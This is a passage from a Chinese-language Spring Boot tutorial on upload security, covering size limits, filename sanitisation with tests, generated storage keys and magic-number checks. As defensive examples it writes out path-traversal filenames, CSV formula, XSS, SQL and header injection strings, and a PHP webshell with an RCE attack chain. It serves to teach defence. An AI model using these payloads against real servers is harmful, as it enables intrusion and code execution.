 *   <li>Tomcat 的 {@code max-file-size} 是「邊讀邊算」，超過才拒絕 ——
 *       此時剩餘的 body 可能超過 {@code maxSwallowSize}，導致連線被重置，
 *       使用者看不到我們的 413 Problem JSON（5.3.7）。</li>
 *   <li>這一層在**一個 byte 的 body 都還沒讀**的時候就決定，
 *       所以總是能乾淨地回應。</li>
 * </ul>
 *
 * <p>⚠️ 它不能取代 Tomcat 的檢查：{@code Content-Length} 是客戶端宣告的，
 * 而且 {@code Transfer-Encoding: chunked} 沒有 {@code Content-Length}。
 * <b>兩層都要有。</b>
 */
@Component
@Order(-118)
public class RequestSizeLimitFilter extends OncePerRequestFilter {

    private final long maxJsonBytes;
    private final long maxMultipartBytes;
    private final ProblemWriter problemWriter;

    public RequestSizeLimitFilter(ApiLimitProperties limits,
                                  UploadProperties uploads,
                                  ProblemWriter problemWriter) {
        this.maxJsonBytes = limits.maxRequestBodyBytes();
        // ★ multipart 用不同（大得多）的上限 —— 這是這個 filter 相對 04 章版本的改動
        this.maxMultipartBytes = uploads.maxRequestSize().toBytes();
        this.problemWriter = problemWriter;
    }

    @Override
    protected void doFilterInternal(HttpServletRequest req, HttpServletResponse res,
                                    FilterChain chain) throws ServletException, IOException {

        boolean multipart = isMultipart(req);
        long limit = multipart ? maxMultipartBytes : maxJsonBytes;
        long declared = req.getContentLengthLong();

        if (declared > limit) {
            problemWriter.write(req, res, ErrorCode.PAYLOAD_TOO_LARGE,
                    "Request body of %d bytes exceeds the limit of %d bytes."
                            .formatted(declared, limit),
                    Map.of("maxBytes", limit,
                           "actualBytes", declared,
                           "hint", multipart
                                   ? "檔案超過 %s，請壓縮後再上傳，或改用預簽名上傳。"
                                           .formatted(DataSize.ofBytes(limit))
                                   : "請減少請求內容。"));
            return;                                  // ★ 不呼叫 chain.doFilter
        }
        chain.doFilter(req, res);
    }

    private boolean isMultipart(HttpServletRequest req) {
        String contentType = req.getContentType();
        return contentType != null
                && contentType.toLowerCase().startsWith("multipart/");
    }

    /** ★ 這個 filter 不需要對 GET / HEAD 做任何事。 */
    @Override
    protected boolean shouldNotFilter(HttpServletRequest request) {
        String method = request.getMethod();
        return "GET".equals(method) || "HEAD".equals(method)
                || "OPTIONS".equals(method) || "TRACE".equals(method);
    }
}
```

**advice 的部分**（03 章 3.7.2 的 `ApiExceptionHandler` 補上這兩個方法）：

```java
    /**
     * 檔案或請求超過上限。
     *
     * <p>★ {@code ResponseEntityExceptionHandler}（Spring 6）已經有一個
     * {@code handleMaxUploadSizeExceededException}，這裡覆寫它換成我們的 Problem 格式。
     *
     * <p>⚠️ 這個 handler 常常「沒被呼叫」—— 見 5.3.7 的 maxSwallowSize 說明。
     * 所以 {@link RequestSizeLimitFilter} 才是主要防線，這裡是後備。
     */
    @Override
    protected ResponseEntity<Object> handleMaxUploadSizeExceededException(
            MaxUploadSizeExceededException ex, HttpHeaders headers,
            HttpStatusCode status, WebRequest request) {

        // ex.getMaxUploadSize() 在 Tomcat 上常常是 -1（拿不到），所以用設定值
        Problem problem = problems.from(ErrorCode.PAYLOAD_TOO_LARGE,
                instanceOf(request),
                "Uploaded content exceeds the configured limit.",
                Map.of("maxFileSizeBytes", uploads.maxFileSize().toBytes(),
                       "maxRequestSizeBytes", uploads.maxRequestSize().toBytes(),
                       "hint", "單一檔案上限 %s，整個請求上限 %s。"
                               .formatted(uploads.maxFileSize(), uploads.maxRequestSize())));

        return new ResponseEntity<>(problem, problemHeaders(headers),
                                    HttpStatus.PAYLOAD_TOO_LARGE);
    }

    /**
     * multipart 解析失敗（boundary 壞掉、body 被截斷、缺少結束 boundary）。
     *
     * <p>★ 為什麼是 400 而不是 413：這是「格式錯誤」不是「太大」。
     * 客戶端重送同樣的內容也會失敗 —— 它需要修正請求，不是縮小檔案。
     */
    @ExceptionHandler(MultipartException.class)
    public ResponseEntity<Problem> handleMultipart(MultipartException ex,
                                                   HttpServletRequest request) {
        // ⚠️ 一定要先排除子類別 MaxUploadSizeExceededException ——
        //    但 Spring 的 handler 方法選擇規則（03 章 3.3.3）會挑最精確的那個，
        //    所以 MaxUploadSizeExceededException 會走上面那個方法。這裡不用自己判斷。
        log.warn("multipart 解析失敗 uri={} reason={}",
                 request.getRequestURI(), ex.getMessage());

        Problem problem = problems.from(ErrorCode.MALFORMED_REQUEST,
                ProblemFactory.instanceOf(request),
                "The multipart request could not be parsed.",
                Map.of("hint", "請確認 Content-Type 含正確的 boundary，且請求未被中斷。"));

        return ResponseEntity.badRequest()
                .contentType(MediaType.APPLICATION_PROBLEM_JSON)
                .body(problem);
    }
```

⚠️ **還有第五種失敗，很新也很容易踩：Tomcat 的 part 數量上限。**

較新版本的 Tomcat 10.1.x / 11.0.x 加了 `maxPartCount`（預設 **10**）
與 `maxPartHeaderSize`，用來防「幾萬個小 part」的資源耗盡攻擊。

```
POST /order-import-jobs
（含 1 個 CSV + 15 個欄位對映的表單欄位 = 16 個 part）
→ 在舊版 Tomcat 正常
→ 在有 maxPartCount=10 的版本 → IllegalStateException → 400
```

```yaml
server:
  tomcat:
    # ⚠️ 這個 property 是否存在取決於你的 Tomcat 版本 ——
    #    請用 `./mvnw dependency:tree | grep tomcat-embed-core` 確認版本，
    #    再查該版本的文件。不存在的 property 在 Boot 裡會被忽略（不會啟動失敗）。
    max-part-count: 30
```

> **這一條是「請自己驗證」的典型例子**：
> Tomcat 的 patch 版本會加入新的安全上限，而它們的預設值可能打破你既有的功能。
> **升級 Boot 的 patch 版本後，要跑一次「多 part 上傳」的整合測試**（5.13.2）。

**四層上限的最終對照表**：

| 層 | 設定 | shop-service 的值 | 誰會碰到 | 回應 |
|---|---|---|---|---|
| Nginx | `client_max_body_size` | 21 MB | 惡意超大請求 | Nginx 的 413 JSON（03 章 3.10.3） |
| Filter (-118) | `api.upload.max-request-size` | 20 MB | 宣告了 `Content-Length` 的過大請求 | ✅ 我們的 413 Problem |
| Tomcat | `max-request-size` | 20 MB | chunked 編碼的過大請求 | advice 的 413（⚠️ 可能被 RST 打斷） |
| Tomcat | `max-file-size` | 10 MB | 單一大檔 | advice 的 413（⚠️ 同上） |

---

## 5.4 檔名：一個完全不可信的輸入 ★

### 5.4.1 `getOriginalFilename()` 的四種攻擊

`MultipartFile.getOriginalFilename()` 的 javadoc 自己就寫著：

> "This may contain path information depending on the browser used,
> but it typically will not with any other than Opera."

**「typically will not」不是安全保證。** 而攻擊者用的不是瀏覽器，是 curl。

**攻擊 1：路徑穿越（事故 5.2.2）**

```
filename="../../../../opt/app/config/application.yml"
filename="..\..\..\..\Windows\System32\drivers\etc\hosts"     ← 反斜線（Windows）
filename="....//....//etc/passwd"                              ← 過濾一次 "../" 的繞過
filename="%2e%2e%2f%2e%2e%2fetc%2fpasswd"                      ← URL 編碼（如果你解碼了）
```

⚠️ **第三種是「只做一次字串替換」的經典繞過。**
**而它的細節值得算清楚，因為兩種寫法的結果不一樣**：

```java
String attack = "....//....//etc/passwd";

// 🔴 天真的修法 A：移除 ".."
attack.replace("..", "")        // → "////etc/passwd"
// ⚠️ 這一個「剛好」擋掉了相對路徑，但變成了【絕對路徑】——
//    Path.of(baseDir).resolve("////etc/passwd") 在 POSIX 上會回傳 "/etc/passwd"，
//    因為 resolve() 遇到絕對路徑會【丟棄 baseDir】。★ 同樣是穿越，只是換一種方式。

// 🔴🔴 天真的修法 B：移除 "../"（更常見的寫法）
attack.replace("../", "")       // → "../../etc/passwd"   ← ★ 直接還原成穿越
// 移除之後剩下的字元又組成了新的 "../" —— 這就是「雙寫繞過」。
```

**兩個結論**：

| | |
|---|---|
| **單次字串替換永遠可以被繞過** | 移除之後剩下的字元會組成新的攻擊字串 |
| **「迴圈替換到不變為止」也不夠** | `replace("../","")` 迴圈到收斂會得到 `etc/passwd` —— 看起來安全，但它把使用者的合法檔名 `2024../report.pdf` 也改壞了，而且下一種編碼（`%2e%2e%2f`、`..%c0%af`）又能繞過 |

👉 **所以 5.4.2 的做法不是「過濾」，而是「只取最後一段 + 白名單字元 + 自己產生儲存 key」**
—— 一個不需要判斷「這是不是攻擊」的做法。

**攻擊 2：null byte 截斷**

```
filename="avatar.jpg\u0000.jsp"
```

意圖：讓「副檔名檢查」看到 `.jsp`… 不，反過來 —— 讓**檢查看到 `.jpg`**，
而底層的 C 函式（某些原生程式庫、某些舊版 JVM 的檔案 API）在 null byte 處截斷，
實際建立的是 `avatar.jpg`。或反向操作讓檔案落地成 `.jsp`。

現代 Java NIO 會拒絕含 `\u0000` 的路徑（`InvalidPathException`），
**但如果你把這個檔名送去 S3 當 key、或存進資料庫、或放進 HTTP header，那些地方不會拒絕。**

**攻擊 3：超長檔名 / 保留名稱**

```
filename="AAAA…（4096 個 A）.jpg"      → 大多數檔案系統的檔名上限是 255 bytes
filename="."                           → 目錄
filename=".."                          → 上層目錄
filename=""                            → 空
filename="CON"、"NUL"、"COM1"          → Windows 保留裝置名
filename=".htaccess"                   → 蓋掉 Apache 設定
filename="web.config"                  → 蓋掉 IIS 設定
```

⚠️ **中文檔名的長度陷阱**：「商品主圖」是 4 個字元但 12 個 UTF-8 bytes。
檔案系統的 255 限制是 **bytes**。所以「截到 100 個字元」在中文檔名上可能還是超長。

**攻擊 4：內容注入（檔名進了別的地方）**

```
filename="report\r\nSet-Cookie: admin=true.csv"     ← HTTP header 注入
filename="=cmd|'/c calc'!A1.csv"                     ← CSV 公式注入（Excel 會執行）
filename="<script>alert(1)</script>.jpg"             ← 檔名顯示在網頁上 → XSS
filename="'; DROP TABLE images; --.jpg"              ← 如果你用字串拼 SQL
filename="主圖.jpg\n2026-08-19 ERROR fake log line"  ← log injection（04 章 4.5.3）
```

⚠️ **第四類最容易被忽略**，因為它不是「寫檔案」的問題，
而是**「這個字串後來去了哪裡」**的問題：

| 檔名的去處 | 風險 |
|---|---|
| 資料庫欄位 | 長度溢出、SQL injection（如果拼字串） |
| HTTP `Content-Disposition`（下載時回傳） | header 注入、下載檔名詭異 |
| 前端顯示 | XSS |
| 應用日誌 | log injection（04 章 4.5.3） |
| S3 object key | key 裡的 `../` 造成物件覆蓋 |
| Excel / CSV 匯出 | 公式注入 |

### 5.4.2 完整的檔名處理

**核心決定：把「儲存檔名」與「顯示檔名」完全分開。**

```
儲存檔名（storage key）  = 我們產生的，客戶端無法影響
顯示檔名（display name）= 客戶端送的，經過清理，只用來「顯示」與「下載時的建議檔名」
```

```java
package example.shop.common.upload;

import java.text.Normalizer;
import java.util.Locale;
import java.util.Set;

/**
 * 檔名的清理與正規化。
 *
 * <p>★ 這個類別的存在前提是一個決定：
 * <b>我們永遠不用客戶端的檔名當儲存路徑</b>（5.4.3）。
 * 它產出的字串只有兩個用途：
 * <ol>
 *   <li>存進資料庫的 {@code displayName}（給使用者看「我上傳的是哪個檔」）。</li>
 *   <li>下載時放進 {@code Content-Disposition} 的建議檔名（5.8.1）。</li>
 * </ol>
 *
 * <p>因為用途受限，這裡可以用「非常保守的白名單」而不必擔心誤殺 ——
 * 最壞的情況是使用者看到 {@code upload.jpg} 而不是他原本的檔名，
 * 而不是伺服器被寫入任意檔案。
 */
public final class SafeFilename {

    /** 顯示用檔名的長度上限（字元數）。 */
    private static final int MAX_BASE_CHARS = 80;

    /** 顯示用檔名的位元組上限（UTF-8）—— 中文檔名會先碰到這個。 */
    private static final int MAX_BASE_BYTES = 200;

    /** Windows 保留裝置名（不分大小寫，且含 "NAME.ext" 形式）。 */
    private static final Set<String> RESERVED = Set.of(
            "con", "prn", "aux", "nul",
            "com1", "com2", "com3", "com4", "com5", "com6", "com7", "com8", "com9",
            "lpt1", "lpt2", "lpt3", "lpt4", "lpt5", "lpt6", "lpt7", "lpt8", "lpt9");

    private static final String FALLBACK = "upload";

    /**
     * 把客戶端送來的檔名清成「可以安全顯示與傳遞」的字串。
     *
     * @param raw             {@code MultipartFile.getOriginalFilename()}，可以是 null
     * @param fallbackExtension 清理後沒有副檔名時要用的（例如由 magic number 判定的 "jpg"）
     * @return 一定非空、一定不含路徑分隔符、一定不含控制字元的檔名
     */
    public static String sanitize(String raw, String fallbackExtension) {

        // ── 步驟 1：null / 空 ─────────────────────────────────────
        if (raw == null || raw.isBlank()) {
            return withExtension(FALLBACK, fallbackExtension);
        }

        String name = raw;

        // ── 步驟 2：Unicode 正規化 ★ ──────────────────────────────
        // 為什麼要做：
        //  (a) macOS 送 NFD（「ㄍ」+ 組合記號），Linux 用 NFC —— 不正規化會產生兩個不同的字串
        //  (b) 有些「看起來像 /」的 Unicode 字元（U+2215 ∕、U+FF0F ／）在 NFKC 下會變成 /
        //      → 先正規化再過濾，才不會漏掉它們
        name = Normalizer.normalize(name, Normalizer.Form.NFKC);

        // ── 步驟 3：只取「最後一段」 ★ ────────────────────────────
        // 這是防路徑穿越的核心：不是「移除 ..」，而是「只保留最後一個分隔符之後的部分」。
        // "../../etc/passwd"        → "passwd"
        // "....//....//etc/passwd"  → "passwd"
        // "C:\\evil\\a.jpg"         → "a.jpg"
        // ★ 這種做法無法被雙寫繞過，因為它不做替換，而是取子字串。
        int lastSlash = Math.max(name.lastIndexOf('/'), name.lastIndexOf('\\'));
        if (lastSlash >= 0) {
            name = name.substring(lastSlash + 1);
        }
        // 冒號也要處理（macOS 的舊路徑分隔符、Windows 的 drive/ADS 語法 "a.jpg:evil"）
        int colon = name.indexOf(':');
        if (colon >= 0) {
            name = name.substring(0, colon);
        }

        // ── 步驟 4：拆出 base 與 extension ────────────────────────
        String base;
        String extension;
        int dot = name.lastIndexOf('.');
        if (dot > 0 && dot < name.length() - 1) {
            base = name.substring(0, dot);
            extension = name.substring(dot + 1);
        } else {
            base = name;
            extension = "";
        }

        // ── 步驟 5：白名單過濾（不是黑名單）★ ─────────────────────
        base = filterBase(base);
        extension = filterExtension(extension);

        // ── 步驟 6：長度（字元 + 位元組雙重限制）★ ─────────────────
        base = truncate(base, MAX_BASE_CHARS, MAX_BASE_BYTES);

        // ── 步驟 7：空 / 保留名稱 / 只有點 ────────────────────────
        if (base.isBlank() || RESERVED.contains(base.toLowerCase(Locale.ROOT))) {
            base = FALLBACK;
        }
        // ⚠️ Windows 不允許檔名以點或空白結尾（會被靜默移除 → 造成不一致）
        while (base.endsWith(".") || base.endsWith(" ")) {
            base = base.substring(0, base.length() - 1);
        }
        if (base.isBlank()) {
            base = FALLBACK;
        }

        return withExtension(base, extension.isEmpty() ? fallbackExtension : extension);
    }

    /**
     * 清理檔名，並<b>強制</b>使用指定的副檔名。
     *
     * <p>★★ 與 {@link #sanitize(String, String)} 的差別是第二個參數的語意：
     *
     * <table>
     *   <tr><th>方法</th><th>第二個參數</th><th>用在</th></tr>
     *   <tr><td>{@code sanitize}</td><td><b>fallback</b>（原本有副檔名就沿用）</td>
     *       <td>收據、附件下載（5.8）——「客戶端原本的副檔名是對的」</td></tr>
     *   <tr><td><b>{@code sanitizeForcing}</b></td><td><b>強制</b>（一律換掉）</td>
     *       <td>圖片上傳（5.5.7）——<b>內容被二次編碼過，原本的副檔名已經不成立</b></td></tr>
     * </table>
     *
     * <p>★ 為什麼圖片上傳一定要「強制」：
     *
     * <pre>
     * 客戶端送 filename="../../../../opt/app/config/application.yml"，內容是合法 PNG
     *   → sanitize(raw, "png")        → "application.yml"   🔴 顯示成一個 .yml 檔
     *   → sanitizeForcing(raw, "png") → "application.png"   ✅
     * </pre>
     *
     * <p>那個 {@code .yml} 不會造成路徑穿越（{@code storageKey} 是我們自己產生的），
     * <b>但它會出現在使用者的下載檔名裡</b> ——
     * 於是使用者存到一個「內容是 PNG、副檔名是 .yml」的檔案，
     * 雙擊打不開，而且看起來像我們的系統壞了。
     *
     * <p>⚠️ 更糟的變體：客戶端送 {@code "photo.html"}。
     * 內容被 {@code ImageReencoder} 換成乾淨的 PNG，
     * 但如果 {@code Content-Disposition} 的檔名是 {@code photo.html}，
     * 某些瀏覽器會依<b>副檔名</b>而不是 {@code Content-Type} 決定怎麼處理它
     * （5.8.1 的 sniffing 問題）。
     */
    public static String sanitizeForcing(String raw, String forcedExtension) {
        String sanitized = sanitize(raw, forcedExtension);
        int dot = sanitized.lastIndexOf('.');
        String base = (dot > 0) ? sanitized.substring(0, dot) : sanitized;
        return withExtension(base, filterExtension(forcedExtension));
    }

    /**
     * 白名單：中日韓文字、拉丁字母、數字、以及三個安全的標點。
     *
     * <p>★ 為什麼用白名單而不是「移除危險字元」：
     * 危險字元的清單永遠列不完（控制字元、Unicode 方向覆寫 U+202E、
     * 零寬字元、各種同形字），而白名單只需要列出「我們要的」。
     */
    private static String filterBase(String s) {
        StringBuilder out = new StringBuilder(s.length());
        s.codePoints().forEach(cp -> {
            if (isAllowedInBase(cp)) {
                out.appendCodePoint(cp);
            } else if (out.length() > 0 && out.charAt(out.length() - 1) != '_') {
                // ★ 不合法字元換成單一底線（而不是刪掉）——
                //   刪掉會讓 "a<b>c" 變 "abc"（看不出被改過），
                //   換成 _ 讓使用者知道「檔名被清理了」。
                out.append('_');
            }
        });
        return out.toString();
    }

    private static boolean isAllowedInBase(int cp) {
        if (cp >= 'a' && cp <= 'z') return true;
        if (cp >= 'A' && cp <= 'Z') return true;
        if (cp >= '0' && cp <= '9') return true;
        if (cp == '-' || cp == '_' || cp == ' ') return true;
        // CJK 統一漢字 + 擴充 A + 注音 + 平假名 + 片假名 + 諺文
        if (cp >= 0x4E00 && cp <= 0x9FFF) return true;      // CJK
        if (cp >= 0x3400 && cp <= 0x4DBF) return true;      // CJK ext A
        if (cp >= 0x3040 && cp <= 0x30FF) return true;      // 日文假名
        if (cp >= 0xAC00 && cp <= 0xD7AF) return true;      // 諺文
        if (cp >= 0x3105 && cp <= 0x312F) return true;      // 注音符號
        return false;
    }

    /** 副檔名更嚴格：只允許小寫英數，最長 10。 */
    private static String filterExtension(String s) {
        String lower = s.toLowerCase(Locale.ROOT);
        StringBuilder out = new StringBuilder();
        for (int i = 0; i < lower.length() && out.length() < 10; i++) {
            char c = lower.charAt(i);
            if ((c >= 'a' && c <= 'z') || (c >= '0' && c <= '9')) {
                out.append(c);
            }
        }
        return out.toString();
    }

    /**
     * 同時滿足字元數與位元組數上限。
     *
     * <p>⚠️ 位元組截斷不能用 {@code getBytes()} 再切 —— 那會切在多位元組字元中間，
     * 產生無效的 UTF-8。這裡逐字元累加。
     */
    private static String truncate(String s, int maxChars, int maxBytes) {
        StringBuilder out = new StringBuilder();
        int bytes = 0;
        int chars = 0;
        for (int i = 0; i < s.length(); ) {
            int cp = s.codePointAt(i);
            int cpChars = Character.charCount(cp);
            int cpBytes = utf8Length(cp);
            if (chars + 1 > maxChars || bytes + cpBytes > maxBytes) break;
            out.appendCodePoint(cp);
            chars++;
            bytes += cpBytes;
            i += cpChars;
        }
        return out.toString().trim();
    }

    private static int utf8Length(int cp) {
        if (cp < 0x80) return 1;
        if (cp < 0x800) return 2;
        if (cp < 0x10000) return 3;
        return 4;
    }

    private static String withExtension(String base, String extension) {
        if (extension == null || extension.isBlank()) return base;
        return base + "." + filterExtension(extension);
    }

    private SafeFilename() {}
}
```

**測試（這個類別一定要有詳細測試）**：

```java
package example.shop.common.upload;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.CsvSource;
import org.junit.jupiter.api.Test;

import static org.assertj.core.api.Assertions.assertThat;

class SafeFilenameTest {

    @ParameterizedTest
    @DisplayName("路徑穿越的各種寫法都被還原成單一檔名")
    @CsvSource(delimiter = '|', value = {
        "../../../../opt/app/config/application.yml | application.yml",
        "..\\..\\..\\Windows\\System32\\hosts       | hosts.jpg",
        "....//....//etc/passwd                     | passwd.jpg",
        "/etc/passwd                                | passwd.jpg",
        "a/b/c/main.jpg                             | main.jpg",
        "C:\\evil\\a.jpg                            | a.jpg",
    })
    void 路徑穿越(String raw, String expected) {
        assertThat(SafeFilename.sanitize(raw, "jpg")).isEqualTo(expected);
    }

    /**
     * ★★ {@code sanitize} 的第二個參數是 <b>fallback</b>，不是「強制」。
     *
     * <p>這一組測試把那個語意釘住 —— 它曾經被誤解過：
     * 5.13.1 的整合測試期望 {@code application.png}，
     * 而 {@code sanitize("…/application.yml", "png")} 其實會回 {@code application.yml}。
     * <b>兩個都是對的，只是要用對方法。</b>
     */
    @ParameterizedTest
    @DisplayName("★ sanitize 沿用原副檔名；sanitizeForcing 強制換掉")
    @CsvSource(delimiter = '|', value = {
        // raw                                        | sanitize(…,"png")  | sanitizeForcing(…,"png")
        "../../opt/app/config/application.yml         | application.yml    | application.png",
        "photo.html                                   | photo.html         | photo.png",
        "主圖.JPEG                                     | 主圖.jpeg          | 主圖.png",
        "沒有副檔名                                     | 沒有副檔名.png       | 沒有副檔名.png",
    })
    void 副檔名的兩種語意(String raw, String fallbackResult, String forcedResult) {
        assertThat(SafeFilename.sanitize(raw.strip(), "png"))
                .as("sanitize：原本有副檔名就沿用")
                .isEqualTo(fallbackResult.strip());
        assertThat(SafeFilename.sanitizeForcing(raw.strip(), "png"))
                .as("sanitizeForcing：一律換成實際內容的副檔名")
                .isEqualTo(forcedResult.strip());
    }

    @ParameterizedTest
    @DisplayName("注入類的字元被換成底線")
    @CsvSource(delimiter = '|', value = {
        "report\r\nSet-Cookie: admin=true.csv | report_Set-Cookie_ admin_true.csv",
        "<script>alert(1)</script>.jpg        | _script_alert_1___script_.jpg",
        "'; DROP TABLE images; --.jpg         | _ DROP TABLE images_ --.jpg",
    })
    void 注入字元(String raw, String expected) {
        // ★ 不去硬記精確輸出，重點是「一定不含這些字元」
        String result = SafeFilename.sanitize(raw, "jpg");
        assertThat(result)
                .doesNotContain("\r").doesNotContain("\n")
                .doesNotContain("<").doesNotContain(">")
                .doesNotContain("'").doesNotContain(";")
                .doesNotContain("/").doesNotContain("\\");
    }

    @Test
    @DisplayName("null byte 被移除")
    void nullByte() {
        assertThat(SafeFilename.sanitize("avatar.jpg\u0000.jsp", "jpg"))
                .doesNotContain("\u0000");
    }

    @Test
    @DisplayName("中文檔名被保留")
    void 中文() {
        assertThat(SafeFilename.sanitize("商品主圖-2026.jpg", "jpg"))
                .isEqualTo("商品主圖-2026.jpg");
    }

    @Test
    @DisplayName("中文檔名的位元組上限：200 bytes / 3 = 約 66 個中文字")
    void 中文長度() {
        String longChinese = "圖".repeat(200) + ".jpg";
        String result = SafeFilename.sanitize(longChinese, "jpg");
        assertThat(result.getBytes(java.nio.charset.StandardCharsets.UTF_8).length)
                .isLessThanOrEqualTo(200 + 4);      // +4 是 ".jpg"
    }

    @ParameterizedTest
    @DisplayName("退化情況都有安全的預設值")
    @CsvSource(delimiter = '|', value = {
        "''      | upload.jpg",
        ".       | upload.jpg",
        "..      | upload.jpg",
        "...     | upload.jpg",
        "CON     | upload.jpg",
        "con.jpg | upload.jpg",
        "NUL.png | upload.png",
        "'   '   | upload.jpg",
    })
    void 退化情況(String raw, String expected) {
        assertThat(SafeFilename.sanitize(raw.trim().isEmpty() ? "" : raw, "jpg"))
                .isEqualTo(expected);
    }

    @Test
    @DisplayName("null 不會爆")
    void nullInput() {
        assertThat(SafeFilename.sanitize(null, "png")).isEqualTo("upload.png");
    }

    @Test
    @DisplayName("Unicode 同形斜線在 NFKC 後也被當成路徑分隔符處理")
    void 同形斜線() {
        // U+FF0F FULLWIDTH SOLIDUS → NFKC → '/'
        assertThat(SafeFilename.sanitize("etc\uFF0Fpasswd.jpg", "jpg"))
                .isEqualTo("passwd.jpg");
    }

    @Test
    @DisplayName("Unicode 方向覆寫字元被移除（防「gpj.exe」顯示成「exe.jpg」）")
    void 方向覆寫() {
        // U+202E RIGHT-TO-LEFT OVERRIDE 是一個經典的檔名偽裝手法
        assertThat(SafeFilename.sanitize("evil\u202Egpj.exe", "jpg"))
                .doesNotContain("\u202E");
    }
}
```

⚠️ **最後一個測試值得說明**：`U+202E`（右到左覆寫）讓
`invoice\u202Egpj.exe` 在檔案總管裡顯示成 `invoiceexe.jpg`。
使用者以為在開圖片，其實在執行 exe。**這是 2011 年就有的手法，至今仍然有效。**

### 5.4.3 儲存檔名：為什麼一定要自己產生

```java
package example.shop.common.upload;

import com.github.f4b6a3.ulid.UlidCreator;

import java.time.LocalDate;
import java.time.ZoneOffset;

/**
 * 儲存 key 的產生。
 *
 * <p>★ 三個設計決定：
 * <ol>
 *   <li><b>完全不含客戶端輸入。</b> key 是「日期 + ULID + 由 magic number 判定的副檔名」，
 *       客戶端無法影響其中任何一個字元 → 路徑穿越在結構上不可能。</li>
 *   <li><b>日期前綴。</b> 讓「刪除 90 天前的暫存上傳」變成一次 prefix 掃描，
 *       也避免單一目錄下有數百萬個檔案（本機檔案系統會變慢）。</li>
 *   <li><b>ULID 而不是 UUID v4。</b> ULID 有時間前綴 → 同一天的物件在 S3 的 key
 *       空間裡相鄰，list 操作可預測；而且是 26 個字元（比 UUID 的 36 短）。</li>
 * </ol>
 */
public final class StorageKeys {

    /**
     * @param folder    用途分區（"product-images"、"order-receipts"、"exports"）
     * @param extension 已由 {@link ContentTypeDetector} 判定的副檔名，不是客戶端給的
     */
    public static String generate(String folder, String extension) {
        LocalDate today = LocalDate.now(ZoneOffset.UTC);
        String id = UlidCreator.getMonotonicUlid().toString().toLowerCase();
        return "%s/%04d/%02d/%02d/%s.%s".formatted(
                folder, today.getYear(), today.getMonthValue(), today.getDayOfMonth(),
                id, extension);
    }

    private StorageKeys() {}
}
```

```
product-images/2026/08/24/01k39w5r7qz8h2n4m6p8v0x2c4.jpg
```

**「不用原檔名」還解決了四個非安全性的問題**：

| 問題 | 用原檔名 | 用產生的 key |
|---|---|---|
| 兩個使用者都上傳 `IMG_0001.jpg` | 後者覆蓋前者 🔴 | 不可能碰撞 |
| 使用者上傳同一張圖兩次 | 覆蓋（可能是他要的，也可能不是） | 兩個物件，語意明確 |
| 檔名含中文 → CDN / S3 的 URL 編碼 | 每一層都可能編碼不一致 | key 是純 ASCII，零風險 |
| 想加 CDN 快取（`Cache-Control: immutable`） | 檔名會被重複使用 → 不能 immutable | key 唯一 → **可以永久快取** ✅ |

⚠️ **最後一條的價值很大**：因為 key 唯一且內容不變，
CDN 可以設 `Cache-Control: public, max-age=31536000, immutable`，
**商品圖的 CDN 命中率會接近 100%**。用原檔名做不到這件事。

---

## 5.5 檔案內容的驗證 ★

### 5.5.1 為什麼副檔名與 `Content-Type` 都不可信

```http
------x
Content-Disposition: form-data; name="file"; filename="cute-cat.jpg"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------x--
```

**副檔名是 `.jpg`、`Content-Type` 是 `image/jpeg`、內容是 PHP。**

這兩個值**都由客戶端提供**，跟 `getOriginalFilename()` 一樣不可信。

**攻擊鏈**（為什麼這件事很嚴重）：

```
① 上傳 cute-cat.jpg（內容是 PHP / JSP / .NET webshell）
② 你把它存到 /var/www/static/uploads/cute-cat.jpg
③ 那個目錄剛好被 Nginx 當靜態資源目錄
④ Nginx 的 location 設定裡有 fastcgi_pass ~ \.php$
   （或你的 Tomcat 把某個目錄當 webapp）
⑤ 攻擊者訪問 /static/uploads/cute-cat.jpg  → 只是一張壞掉的圖
⑥ 但如果他能讓路徑變成 .php 或 .jsp（配合 5.4 的路徑穿越）→ RCE
```

**shop-service 靠三層阻斷這條鏈**：

| 層 | 做法 | 阻斷了什麼 |
|---|---|---|
| 1 | 儲存 key 由我們產生，副檔名由 magic number 決定（5.4.3） | ⑥ 的路徑操縱 |
| 2 | 上傳的物件**存在 S3 / MinIO，不在 web 根目錄** | ③④ 的執行環境 |
| 3 | 圖片一律**二次編碼**（5.5.3） | ① 的內容本身 |

⚠️ **第 2 層是最重要的**：如果上傳的檔案永遠不在任何 web server 的
document root 或 servlet context 裡，那「檔案被當程式執行」在結構上就不可能。

### 5.5.2 magic number 驗證

**每種檔案格式的開頭幾個 byte 是固定的**（file signature / magic number）：

| 格式 | Magic number（hex） | 位置 | 備註 |
|---|---|---|---|
| JPEG | `FF D8 FF` | 0 | 第 4 個 byte 是 `E0`/`E1`/`DB`… 依變體不同 |
| PNG | `89 50 4E 47 0D 0A 1A 0A` | 0 | 8 bytes，非常明確 |
| GIF | `47 49 46 38 37 61` / `…38 39 61` | 0 | `GIF87a` / `GIF89a` |
| WebP | `52 49 46 46` … `57 45 42 50` | 0 和 8 | `RIFF****WEBP`（中間 4 bytes 是長度） |
| PDF | `25 50 44 46 2D` | 0 | `%PDF-` |
| ZIP / OOXML（xlsx、docx） | `50 4B 03 04` | 0 | `PK..`。**xlsx 與 zip 一樣** ⚠️ |
| GZIP | `1F 8B` | 0 | |
| AVIF / HEIC | `…66 74 79 70` | 4 | `ftyp` box |
| SVG | **沒有 magic number** 🔴 | — | 它是 XML（純文字），只能靠解析 |

```java
package example.shop.common.upload;

import java.io.IOException;
import java.io.InputStream;
import java.util.Arrays;
import java.util.List;
import java.util.Optional;

/**
 * 從檔案開頭的位元組判定實際型別。
 *
 * <p>★ 為什麼自己寫而不是直接用 Apache Tika：
 * <ul>
 *   <li>我們只接受 5 種格式，Tika 支援 1,400 種 —— 引入它同時引入了
 *       1,395 種我們不想支援的解析器（每一個都是潛在的攻擊面）。</li>
 *   <li>Tika 的 jar 約 40 MB（含所有 parser）。</li>
 * </ul>
 *
 * <p>⚠️ 但如果你的需求是「接受各種文件並抽取內容」，Tika 是正確的選擇 ——
 * 那時請只依賴 {@code tika-core}（不含 parsers）做偵測，見 5.5.7 的討論。
 */
public final class ContentTypeDetector {

    /** 需要讀多少 bytes 才能判定所有支援的格式（AVIF 要看到 offset 4..11）。 */
    public static final int PROBE_BYTES = 16;

    /** 一種已知格式的簽章。 */
    private record Signature(DetectedType type, int offset, int[] bytes) {

        boolean matches(byte[] head) {
            if (head.length < offset + bytes.length) return false;
            for (int i = 0; i < bytes.length; i++) {
